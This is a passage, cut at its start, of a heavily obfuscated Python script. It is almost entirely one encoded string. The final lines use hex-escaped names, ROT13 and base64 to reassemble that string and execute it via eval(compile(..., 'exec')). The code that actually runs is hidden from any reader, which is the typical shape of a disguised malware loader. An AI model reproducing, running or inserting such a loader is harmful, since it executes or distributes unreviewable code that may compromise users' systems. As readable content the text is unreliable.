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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))